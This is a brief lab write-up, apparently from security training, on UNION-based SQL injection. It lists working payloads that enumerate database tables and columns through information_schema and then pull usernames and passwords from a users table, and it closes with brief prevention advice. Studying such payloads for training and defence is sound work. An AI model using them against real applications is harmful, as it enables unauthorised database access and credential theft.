# 🧪 Lab: SQL Injection UNION Attack - Database Enumeration

## 🎯 Goal
Discover table and column names, then extract data

## 🔍 Vulnerability Type
UNION-based SQL Injection

## ⚙️ Payloads Used
' UNION SELECT table_name, NULL FROM information_schema.tables--
' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name='users'--
' UNION SELECT username, password FROM users--

## 🧠 Explanation
When table/column names are unknown, we query the information_schema database.

- information_schema.tables → lists tables
- information_schema.columns → lists columns

## 💥 Exploitation Steps
1. Find table names:
   ' UNION SELECT table_name, NULL FROM information_schema.tables--
2. Identify target table (e.g., users)
3. Find columns:
   ' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name='users'--
4. Extract data:
   ' UNION SELECT username, password FROM users--

## 🌍 Real-World Impact
- Full database discovery
- Sensitive data exposure
- Complete system compromise

## 🛡️ Prevention
- Parameterized queries
- Restrict database metadata access
- Proper input validation
